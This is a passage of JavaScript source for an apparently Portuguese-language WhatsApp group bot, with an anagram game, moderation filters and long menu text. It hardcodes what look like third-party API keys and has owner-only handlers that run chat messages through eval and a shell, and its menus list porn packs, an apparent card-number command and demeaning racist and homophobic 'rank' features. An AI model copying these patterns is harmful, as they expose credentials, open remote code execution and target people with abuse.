{
original: 'LOBISOMEM',
embaralhada: 'NPUIMGI',
dica: 'MONSTRO'
},
{
original: 'VENDEDORA',
embaralhada: 'VERADDEON',
dica: 'PROFISSAO'
},
{       
original: 'TANGERINA',
embaralhada: 'RITAANGNE',
dica: 'ALIMENTO'
}
]		
		//JOGO DO ANAGRAM
if(isGroup && fs.existsSync(`./src/anagrama-${from}.json`)){
let dataAnagrama = JSON.parse(fs.readFileSync(`./src/anagrama-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataAnagrama.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataAnagrama.original) return reply('está perto')
xp = Math.floor(Math.random() * 14) + 500
dinhero = Math.floor(Math.random() * 10) + 4000
if(budy.toUpperCase() == dataAnagrama.original) { loli.sendMessage(from, `parabéns ${pushname} 🥳 você ganhou o jogo\nPalavra : ${dataAnagrama.original}\nIniciando o proximo jogo em 5 segundos...`, MessageType.text, {"mentionedJid": [sender]}), fs.unlinkSync(`./src/anagrama-${from}.json`)		
addLevelingXp(sender, xp)
addKoinUser(sender, dinhero)
recompensa = `🎉🎉RECOMPENSA🎉🎉\nVocê ganhou ${xp} em *xp* e ${dinhero} em *dinhero*`
reply(recompensa)
		setTimeout(async() => {
fs.writeFileSync(`./src/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[Math.floor(Math.random() * palavrasANA.length)])}`)
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./src/anagrama-${from}.json`))
loli.sendMessage(from, `
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${dataAnagrama2.embaralhada}
│➽ DICA: ${dataAnagrama2.dica}
╰────────────────────────
`, MessageType.text) 
}, 5000)
}}
//_TIPO DE MENSAGEM
const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isDocument = type == 'documentMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isDocument) typeMessage = "Document"
const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

if (!mek.key.fromMe && !isOwner && banChats === true) return 

/*** Anti-Catálogo By JvDarK***/
if (isGroup && isAntiCatalogo && (type == 'productMessage')) {
if (isGroupAdmins) return reply('Isso é um catálogo, mas vc é adm então ta de boa.')
reply('🔰Ƭrανα Ƈαтάℓσgσ ∂єтєcтαdσ\n❌Rємσνєη∂σ❌')
var kik = `${sender.split("@")[0]}@s.whatsapp.net`
setTimeout( () => {
  loli.groupRemove(from, [kik])
}, 2000)
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
loli.sendMessage(from, clear , MessageType.text, {quoted: mek, contextInfo : { forwardingScore: 500, isForwarded:true}})
}

// Anti NSFW
        if (isImage && isGroup && isAntinsfw) {
       if (isGroupAdmins) return reply('TA VACILANDO ADM...')
           var imgbb = require('imgbb-uploader')
            filebuffer = await loli.downloadAndSaveMediaMessage(mek)
            antinsfwup = await imgbb("941644256336912a1409c0bcfce50071", filebuffer)
            result = await axios.post(`https://api.lolhuman.xyz/api/nsfwcheck?apikey=ChOkYbOT8&img=${antinsfwup.display_url}`)
            if (Number(result.result.replace("%", "")) >= 30) return reply(from, "𝗖𝗢𝗡𝗧𝗘𝗨𝗗𝗢 𝗔𝗗𝗨𝗟𝗧𝗢 𝗗𝗘𝗧𝗘𝗖𝗧𝗔𝗗𝗢,𝗥𝗘𝗠𝗢𝗩𝗘𝗡𝗗𝗢 𝗛𝗨𝗠𝗔𝗡𝗢..." + result.result, "AVISO")
            loli.groupRemove(from, [sender])
          }

//ANTI-SPAM BY ITALU
     if (isCmd && isFiltered(from) && !isGroup && isAntiflod ) {
        console.log(color('SPAM', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))
        const ff = {
                  text:  `Sem flood @${sender.split('@')[0]}...\n\n Espere a sua vez o-onichan😡`,
                    contextInfo: {
                        mentionedJid: [sender]
                    }
                 }
        return reply(ff)}
        
        if (isCmd && isFilteredd(from) && !isGroup && isAntiflod ) {
        console.log(color('SPAM', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))
        const ff2 = {
                  text:  `@${sender.split('@')[0]}...\n\nAguarde 8 minutos para usar novamente`,
                    contextInfo: {
                        mentionedJid: [sender]
                    }
                 }
        return reply(ff2)}
        
        if (isCmd && isFiltered(from) && isGroup && isAntiflod ) {
        console.log(color('SPAM', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))
        const ff1 = {
                  text:  `Sem flood @${sender.split('@')[0]}...\n\n Espere a sua vez o-onichan😡`,
                    contextInfo: {
                        mentionedJid: [sender]
                    }
                 }
        return reply(ff1)}

//_CORES(cores das letras no terminal) 
colors = ['red','white','black','blue','yellow','green','aqua','magenta','orange']

//_VISUALIZA AS MENSAGENS 
loli.chatRead(from)

//_CONTAGEM DE COMANDOS
if (isCmd) cmdadd()

//_USUÁRIO BANIDO
if (isCmd && isBanned) {
reply(ptbr.ban())
return console.log(color('[BAN] Ignorando comando', 'blue'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`),'DE:', color(pushname))}
          
//_CONSOLES NO TERMUX

//_CONSOLE DE COMANDOS NO PRIVADO
if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', color(command, "yellow"), 'do', color(pushname, "yellow"), 'horas', color(hr, "yellow"))
//_CONSOLE DE MENSAGENS NO PRIVADO
if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m MSG \x1b[1;37m]', color('Message', "yellow"), 'do', color(pushname, "yellow"), 'horas', color(hr, "yellow"))

//_CONSOLE DE COMANDOS EM GRUPOS 
if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', color(command, "yellow"), 'do', color(pushname, "yellow"), 'Em', color(groupName), 'horas', color(hr, "yellow"))
//_CONSOLE DE MENSAGENS EM GRUPOS
if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m MSG \x1b[1;37m]', color('Message', "yellow"), 'do', color(pushname, "yellow"), 'Em', color(groupName), 'horas', color(hr, "yellow"))

if(isAntiPv && !isOwner && !isvipp && isCmd && !isGroup) return reply('PV BLOQUEADO')
/*
if (m.message && m.isBaileys && m.mtype === 'orderMessage' && !(m.token && m.orderId)) {
reply('Mensagem de pedido \n\n' + require('util').format(m.key))
}
*/

if (budy.startsWith('>')){
if(!isOwner) return
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m EVAL \x1b[1;37m]', color(moment(mek.messageTimestamp * 1000).format('DD/MM HH:mm:ss'), 'yellow'), color(budy))
try {
return reply(JSON.stringify(eval(budy.slice(2)),null,'\t'))
} catch(e) {
reply(`${e}`)
}
}
if (budy.startsWith('=>')){
if (!isOwner) return reply('somente meu criador')
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
  reply(String(e))
}
}
if (body.startsWith('$')) {
if (!isOwner) return 
exec(q, (err, stdout) => {
if(err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

switch (cmdstk) {
case 'TzhfK7pjVkpaxyaxMuqzM+7y1GdTQ5vT6pt6ZQOvnSI=':
const chatts6 = `${totalchat.length}`
let temporalM = loli.prepareMessageFromContent(from,{
"listMessage": {
"title": 
`
╭━════════════════⊷
┃⋆╭───────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────
┃⋆│⬩ 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝖼̧𝗈̃𝖾𝗌
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩                           
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆╰───────────────
╰━════════════════⊷
`,
"description": "* Aperte no seu nome abaixo *",
"buttonText": `${pushname}`,
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": 'Ξ Menu2',
"rowId": 'Menu Menu2'
}, 
{
"title": 'Ξ Jogos',
"rowId": 'Menu Jogos'
},
{
"title": 'Ξ Outros',
"rowId": 'Menu Outros'
},
{
"title": 'Ξ Info',
"rowId": 'Menu Info'
},
{
"title": 'Ξ Grupo',
"rowId": 'Menu Grupo'
},
{
"title": 'Ξ Dono',
"rowId": 'Menu Dono'
},
]
}
]                    
}
}, {quoted:mek})
loli.relayWAMessage(temporalM)
}

if (listRM.includes("Menu Menu2")){
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const chatts1 = `${totalchat.length}`
const menu2 = {
text:
 `
  ${ucapanFakereply}
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝖼̧𝗈̃𝖾𝗌 𝖽𝗈 𝖻𝗈𝗍
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts1} ⟨🏓⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎𝚗𝚞 𝚍𝚎 𝚏𝚒𝚐𝚞𝚛𝚒𝚗𝚑𝚊𝚜
┃⋆│💎➢ ${prefix}St ⟨🔧⟩
┃⋆│➥ Corta uma imagem para sticker
┃⋆│💎➢ ${prefix}Sticker ⟨📄⟩
┃⋆│➥ Faz um sticker com foto/video
┃⋆│💎➢ ${prefix}Toimg ⟨📄⟩
┃⋆│➥ Converte sticker em foto
┃⋆│💎➢ ${prefix}Tomp3 ⟨🌀⟩
┃⋆│➥ Converte video em audio
┃⋆│💎➢ ${prefix}Ttp ⟨🥳⟩
┃⋆│➥ Faz sticker de letras paradas
┃⋆│💎➢ ${prefix}Vid ⟨🐧⟩
┃⋆│➥ Baixa um vídeo do youtube
┃⋆│💎➢ ${prefix}Packs ⟨👿⟩
┃⋆│➥ Packs de porno.
┃⋆│💎➢ ${prefix}Fotos ⟨🥳⟩
┃⋆│➥ Pack de fotos
┃⋆│💎➢ ${prefix}Attp ⟨Texto⟩ ⟨🌸⟩
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp1 ⟨Texto⟩ ⟨🔥⟩
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp2 ⟨Texto⟩ ⟨💮⟩
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp3 ⟨Texto⟩ ⟨🌀⟩
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp4 ⟨Texto⟩ ⟨🌟⟩
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp5 ⟨Texto⟩ ⟨👻⟩
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp6 ⟨Texto⟩ ⟨☔⟩
┃⋆│➥ Faz sticker animado
┃⋆│ Attp 1,2,3,4,5,6 varia o tipo de letra.
┃⋆│  As vezes estão off, então não vai!
┃⋆│💎➢ ${prefix}Play1 ⟨🎵⟩
┃⋆│➥ Fazer download de uma musica
┃⋆│💎➢ ${prefix}Play2 ⟨🎵⟩
┃⋆│➥ Fazer download de uma musica
┃⋆│💎➢ ${prefix}Play3 ⟨🎵⟩
┃⋆│➥ Fazer download de uma musica
┃⋆│💎➢ ${prefix}Play4 ⟨🎵⟩
┃⋆│➥ Fazer download de uma musica
┃⋆│💎➢ ${prefix}img ⟨🌐⟩
┃⋆│➥ Fazer download de uma foto
┃⋆│💎➢ ${prefix}Tts pt ⟨Texto⟩ ⟨☔⟩
┃⋆│➥ Voz do google em vários idioma
┃⋆│💎➢ ${prefix}Wame ⟨✈️⟩
┃⋆│➥ Seu wa.me 
┃⋆│💎➢ ${prefix}Ocr ⟨🔞⟩
┃⋆│➥ Retirar texto de uma foto
┃⋆│💎➢ ${prefix}Cep ⟨🌸⟩
┃⋆│➥ Mostra a pesquisa sobre o cep
┃⋆│💎➢ ${prefix}Cartão ⟨💳⟩
┃⋆│➥ Uns cartões ai, compre algo 
┃⋆│💎➢ ${prefix}Contar ⟨💫⟩
┃⋆│➥ Contar as caracteres
┃⋆│💎➢ ${prefix}Google ⟨💖⟩
┃⋆│➥ Pesquise sobre algo
┃⋆╰───────────────────
╰━════════════════════⊷
`,
contextInfo: {mentionedJid: [sender]}}
loli.sendMessage(from, menu2, text, {quoted: mek})
}

if (listRM.includes("Menu Jogos")){
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const chatts2 = `${totalchat.length}`
const jogos = {
text:
 `
  ${ucapanFakereply}
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ 𝗂𝗇f𝗈𝗋𝗆𝖺𝖼̧𝗈̃𝖾𝗌 𝖽𝗈 𝖻𝗈𝗍
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts2} ⟨🏓⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎𝚗𝚞 𝚍𝚎 𝚍𝚒𝚟𝚎𝚛𝚜𝚊̃𝚘
┃⋆│💎➢ ${prefix}Jogodavelha @pessoa ⟨🤯⟩
┃⋆│➥ Novo jogo da velha
┃⋆│💎➢ ${prefix}Resetavelha ⟨🌺⟩
┃⋆│➥ Reseta o jogo da velha
┃⋆│💎➢ ${prefix}Getbio @pessoa ⟨🧐⟩
┃⋆│➥ Pega o recado recado.
┃⋆│💎➢ ${prefix}anagrama(chame um adm) ⟨🧐⟩
┃⋆│➥ Descobrir a Palavra Embaralhada
┃⋆│💎➢ ${prefix}Shit ⟨😬⟩
┃⋆│➥ shit aleatória shitpost br
┃⋆│💎➢ ${prefix}Nomeninja ⟨TEXTO⟩ ⟨💅🏼⟩
┃⋆│➥ Cria um nome ninja 
┃⋆│💎➢ ${prefix}Dado ⟨🎲⟩
┃⋆│➥ Sticker de dado aleatório  
┃⋆│💎➢ ${prefix}Tagme ⟨🌀⟩
┃⋆│➥ Te menciona 
┃⋆│💎➢ ${prefix}Ppt ⟨🔥⟩
┃⋆│➥ Jogo do papel 
┃⋆│💎➢ ${prefix}Gado ⟨🐂⟩
┃⋆│➥ Lhe diz seu nível de gado 
┃⋆│💎➢ ${prefix}Sn ⟨😬⟩
┃⋆│➥ Lhe diz sim ou não 
┃⋆│💎➢ ${prefix}Chance ⟨🐒⟩
┃⋆│➥ Lhe diz a chance de algo 
┃⋆│💎➢ ${prefix}Pau ⟨😋⟩
┃⋆│➥ tamanho do seu brinquedo
┃⋆│💎➢ ${prefix}Slot ⟨👾⟩
┃⋆│➥ Caça níqueis 
┃⋆│💎➢ ${prefix}Gay ⟨🏳️‍🌈⟩
┃⋆│➥ Lhe  diz o quanto gay você é 
┃⋆│💎➢ ${prefix}Roleta ⟨📄⟩
┃⋆│➥ Roleta russa 
┃⋆│💎➢ ${prefix}Caracoroa ⟨💮⟩
┃⋆│➥ caracoroa 
┃⋆│💎➢ ${prefix}Amongus ⟨👥⟩
┃⋆│➥ "Expulsa" alguém da nave 
┃⋆│💎➢ ${prefix}Level ⟨💖⟩
┃⋆│➥ Mostra seu level atual 
┃⋆│💎➢ ${prefix}Omais ⟨❌⟩
┃⋆│➥ Sorteia alguém para "o mais" 
┃⋆│💎➢ ${prefix}Ttt ⟨🎮⟩
┃⋆│➥ Jogo da velha 
┃⋆│💎➢ ${prefix}Top5 ⟨😬⟩
┃⋆│➥ Menciona os membros 
┃⋆│💎➢ ${prefix}Casal ⟨🙉⟩
┃⋆│➥ Marca um possível casal 
┃⋆│💎➢ ${prefix}Rankfeios ⟨👹⟩
┃⋆│➥ Rank dos mais feios
┃⋆│💎➢ ${prefix}Rankcaco ⟨🐒⟩
┃⋆│➥ Rank dos macacos 
┃⋆│💎➢ ${prefix}Rankgay ⟨🏳️‍🌈⟩
┃⋆│➥ Rank dos mais gays
┃⋆│💎➢ ${prefix}Rank texto ⟨🔥⟩
┃⋆│➥ Rank dos mais ?
┃⋆│💎➢ ${prefix}Abraço @Pessoa ⟨🐂⟩
┃⋆│➥ Dá-lhe um abraço no seu amg
┃⋆│💎➢ ${prefix}Gostosas ⟨🌺⟩
┃⋆│➥ Marque as 5 gostas do grupo
┃⋆╰───────────────────
╰━════════════════════⊷
`,
contextInfo: {mentionedJid: [sender]}}
loli.sendMessage(from, jogos, text, {quoted: say1})
}

if (listRM.includes("Menu Outros")){
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const chatts5 = `${totalchat.length}`
const outros = {
text:
 `
  ${ucapanFakereply}
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝖼̧𝗈̃𝖾𝗌 𝖽𝗈 𝖻𝗈𝗍
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts5} ⟨🏓⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎𝚗𝚞 𝚊𝚕𝚎𝚊𝚝𝚘́𝚛𝚒𝚘
┃⋆│💎➢ ${prefix}More ⟨🧐⟩
┃⋆│➥ Adicionar "Ler mais" a um texto
┃⋆│💎➢ ${prefix}Send ⟨☔⟩
┃⋆│➥ Enviar mensagens pelo bot
┃⋆│💎➢ ${prefix}Gerarnick ⟨👾⟩
┃⋆│➥ Gerarnicks com seu nome
┃⋆│💎➢ ${prefix}Nickff ⟨💖⟩
┃⋆│➥ Gerar outros tipo de letras
┃⋆│💎➢ ${prefix}Getpic ⟨💎⟩
┃⋆│➥ Pega a foto de perfil da pessoa
┃⋆│💎➢ ${prefix}Quando (texto) ⟨🔥⟩
┃⋆│➥ Lhe diz quando irá acontecer
┃⋆│💎➢ ${prefix}Diga (texto) ⟨🌟⟩
┃⋆│➥ O bot irá digitar o que você digitou
┃⋆│💎➢ ${prefix}Map (País) ⟨🌀⟩
┃⋆│➥ Mostrara o mapa do país
┃⋆╰───────────────────
╰━════════════════════⊷
`,
contextInfo: {mentionedJid: [sender]}}
loli.sendMessage(from, outros, text, {quoted: say1})
}

if (listRM.includes("Menu Info")){
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const chatts4 = `${totalchat.length}`
const infor = {
text:
 `
  ${ucapanFakereply}
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ ɪɴғᴏʀᴍᴀᴄ̧ᴏ̃ᴇs ᴅᴏ ʙᴏᴛ
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts4} ⟨🏓⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎𝚗𝚞 𝚍𝚎 𝚒𝚗𝚏𝚘𝚛𝚖𝚊𝚌̧𝚘̃𝚎𝚜
┃⋆│💎➢ ${prefix}Owner ⟨🌸⟩
┃⋆│➥ Numero do meu criador
┃⋆│💎➢ ${prefix}Ping ⟨💎⟩
┃⋆│➥ Teste para ver se tá on
┃⋆│💎➢ ${prefix}Perfil ⟨🧸⟩
┃⋆│➥ Mostrar suas informações
┃⋆│💎➢ ${prefix}Itsme ⟨💫⟩
┃⋆│➥ Seu perfil, com wame
┃⋆│💎➢ ${prefix}Bugreport ⟨💫⟩
┃⋆│➥ Fale sobre erros para o meu dono
┃⋆│💎➢ ${prefix}Request ⟨💖⟩
┃⋆│➥ Quer pedir algo ao dono do bot?
┃⋆│💎➢ ${prefix}Info-bot ⟨👾⟩
┃⋆│➥ Informações do bot
┃⋆│💎➢ ${prefix}Bloqueados ⟨🌀⟩
┃⋆│➥ Lista de usuários bloqueados
┃⋆╰───────────────────
╰━════════════════════⊷
`,
contextInfo: {mentionedJid: [sender]}}
loli.sendMessage(from, infor, text, {quoted: say1})
}

if (listRM.includes("Menu Grupo")){
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroupAdmins && !isOwner) return reply(ptbr.admin())
if (!isGroup) return reply(ptbr.AdmDoBot())
const chatts3 = `${totalchat.length}`
const grupo = {
text:
 `
  ${ucapanFakereply}
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝖼̧𝗈̃𝖾𝗌 𝖽𝗈 𝖻𝗈𝗍
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts3} ⟨📄⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎𝚗𝚞 𝚍𝚎 𝚐𝚛u𝚙𝚘
┃⋆│💎➢ ${prefix}Ban @Pessoa ⟨🔥⟩
┃⋆│➥ Banir marcando a pessoa @<=
┃⋆│💎➢ ${prefix}Banir ⟨🔥⟩
┃⋆│➥ Marque a mensagem da pessoa
┃⋆│💎➢ ${prefix}Add 55xxxx ⟨🌸⟩
┃⋆│➥ Adiciona a pessoa no grupo
┃⋆│💎➢ ${prefix}Add2 ⟨🌸⟩
┃⋆│➥ Marque a mensagem da pessoa
┃⋆│💎➢ ${prefix}Promover @Pessoa ⟨🌀⟩
┃⋆│➥ Promover marcando a pessoa
┃⋆│💎➢ ${prefix}Promote ⟨🌀⟩
┃⋆│➥ Marque a mensagem da pessoa
┃⋆│💎➢ ${prefix}Rebaixar @Pessoa ⟨☔⟩
┃⋆│➥ Rebaixar marcando a pessoa
┃⋆│💎➢ ${prefix}Demote ⟨☔⟩
┃⋆│➥ Marque a mensagem da pessoa
┃⋆│💎➢ ${prefix}Abrir ⟨👾⟩
┃⋆│➥ Abrir grupo 
┃⋆│💎➢ ${prefix}Fechar ⟨👾⟩
┃⋆│➥ Fechar o grupo
┃⋆│💎➢ ${prefix}Gp ⟨🍑⟩
┃⋆│➥ Botão, abrir e fechar grupo
┃⋆│💎➢ ${prefix}Votação ⟨🏓⟩
┃⋆│➥ Fazer uma votação
┃⋆│💎➢ ${prefix}Setname ⟨📄⟩
┃⋆│➥ Alterar nome do grupo
┃⋆│💎➢ ${prefix}Setdesk ⟨📄⟩
┃⋆│➥ Altera a descrição do grupo
┃⋆│💎➢ ${prefix}Setppgc ⟨📄⟩
┃⋆│➥ Altera imagem do grupo
┃⋆│💎➢ ${prefix}Marcar ⟨👥⟩
┃⋆│➥ Marca todos os membros
┃⋆│💎➢ ${prefix}Grupo-info ⟨😬⟩
┃⋆│➥ Informações do grupo
┃⋆│💎➢ ${prefix}Lista-adm ⟨🐒⟩
┃⋆│➥ Listar todos os administradores
┃⋆│💎➢ ${prefix}Link-gp ⟨📑⟩
┃⋆│➥ Link do grupo
┃⋆│💎➢ ${prefix}Notif ⟨🏓⟩
┃⋆│➥ Notificar todos os membros
┃⋆│💎➢ ${prefix}Supertag ⟨🌸⟩
┃⋆│➥ Notificar com áudio/video/sticke
┃⋆│💎➢ ${prefix}Del ⟨😬⟩
┃⋆│➥ Apaga mensagem do bot
┃⋆│💎➢ ${prefix}Welcome ⟨🐦⟩
┃⋆│➥ Modo bem vindo para membros
┃⋆│💎➢ ${prefix}Antilink ⟨🔥⟩
┃⋆│➥ Remover todo tipo de links
┃⋆│💎➢ ${prefix}Antidoc ⟨🌀⟩
┃⋆│➥ Anti documentos
┃⋆│💎➢ ${prefix}Antifake ⟨👻⟩
┃⋆│➥ Banir numeros +1
┃⋆│💎➢ ${prefix}Autofigu ⟨💎⟩
┃⋆│➥ Fazer sticker com foto/vídeo/gif
┃⋆│💎➢ ${prefix}Leveling ⟨☔⟩
┃⋆│➥ Modo leveis 
┃⋆╰───────────────────
╰━━════════════════════⊷
`,
contextInfo: {mentionedJid: [sender]}}
loli.sendMessage(from, grupo, text, {quoted: say1})
}
if (listRM.includes("Menu Dono")){
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return  reply(ptbr.ownerB())
const chatts = `${totalchat.length}`
const dinheiro1 = checkATMuser(sender)
const dono = {
text:
 `
  ${ucapanFakereply}
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ 𝚒𝚗𝚏𝚘𝚛𝚖a𝚌̧𝚘̃𝚎𝚜 d𝚘 𝚋𝚘𝚝
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts} ⟨🏓⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎𝚗𝚞 𝚍𝚘 𝚍𝚘𝚗𝚘
┃⋆│💎➢ ${prefix}Clone ⦗🔥⦘
┃⋆│➥ Copia a foto de perfil do alvo
┃⋆│💎➢ ${prefix}Block ⦗☔⦘
┃⋆│➥ Bloqueia o alvo
┃⋆│💎➢ ${prefix}Unblock ⦗💎⦘
┃⋆│➥ Remove o block do alvo
┃⋆│💎➢ ${prefix}Banpp ⦗💖⦘
┃⋆│➥ Adicionar na lista de banidos
┃⋆│💎➢ ${prefix}Unban ⦗👨🏽‍✈️⦘
┃⋆│➥ Remove da lista de banidos
┃⋆│💎➢ ${prefix}Addvip ⦗🐤⦘
┃⋆│➥ Adciona na lista vip
┃⋆│💎➢ ${prefix}Dellvip ⦗👾⦘
┃⋆│➥ Tira vip do usuário
┃⋆│💎➢ ${prefix}Readallchat ⦗🤝🏼⦘
